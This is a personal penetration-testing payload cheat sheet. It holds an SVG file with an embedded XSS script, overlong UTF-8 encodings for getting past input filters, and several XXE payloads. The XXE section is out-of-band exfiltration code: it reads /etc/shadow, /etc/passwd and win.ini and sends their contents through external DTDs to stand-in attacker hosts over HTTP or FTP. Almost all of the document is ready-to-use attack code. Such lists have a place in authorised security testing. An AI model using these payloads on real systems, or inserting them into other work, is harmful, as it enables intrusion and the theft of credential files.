# Payloads Reference

Payloads I use all the time.

## SVG

Regular valid SVG:

*xml header and doctype are optional*

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="391" height="391" viewBox="-70.5 -70.5 391 391" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
	<rect fill="#fff" stroke="#000" x="-70" y="-70" width="390" height="390"/>
	<g opacity="0.8">
		<rect x="25" y="25" width="200" height="200" fill="lime" stroke-width="4" stroke="pink" />
		<circle cx="125" cy="125" r="75" fill="orange" />
		<polyline points="50,150 50,200 200,200 200,100" stroke="red" stroke-width="4" fill="none" />
		<line x1="50" y1="50" x2="200" y2="200" stroke="blue" stroke-width="4" />
	</g>
</svg>
```

Basic XSS SVG:

```
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" x="50" y="50" fill="red" />
   <script type="text/javascript">
      alert(document.domain);
   </script>
</svg>
```


## Unicode
[Unicode Char transformations link](https://websec.github.io/unicode-security-guide/character-transformations/)

```
＇ fullwidth apos
＜ fullwidth lessthan
🎅 santa emoji


Target	NSF 1	NSF 2	NSF 3	Notes	
A	%C1%81	%E0%81%81	%F0%80%81%81	Latin A useful as a base test case.	
"	%C0%A2	%E0%80%A2	%F0%80%80%A2	Double quote	
'	%C0%A7	%E0%80%A7	%F0%80%80%A7	Single quote	
<	%C0%BC	%E0%80%BC	%F0%80%80%BC	Less-than sign	
>	%C0%BE	%E0%80%BE	%F0%80%80%BE	Greater-than sign	
.	%C0%AE	%E0%80%AE	%F0%80%80%AE	Full stop	
/	%C0%AF	%E0%80%AF	%F0%80%80%AF	Solidus	
\	%C1%9C	%E0%81%9C	%F0%80%81%9C	Reverse solidus

```

## XXE 
[See full list here](https://gist.github.com/staaldraad/01415b990939494879b4)

```
--------------------------------------------------------------
Vanilla, used to verify outbound xxe or blind xxe
--------------------------------------------------------------

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
]>
<r>&sp;</r>

----------------------------------------------------------------
OoB (seems to work better against .NET)
----------------------------------------------------------------
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
%exfil;
]>

## External dtd: ##

<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">

---------------------------------------------------------------
OoB extraction
---------------------------------------------------------------

<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/shadow">
<!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd">
%sp;
%param3;
%exfil;
]>

## External dtd: ##
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">

-----------------------------------------------------------------------
OoB extra ERROR -- Java
-----------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/passwd">
<!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd">
%sp;
%param3;
%exfil;
]>
<r></r>
## External dtd: ##

<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%data3;">'> %param1; %external;


```
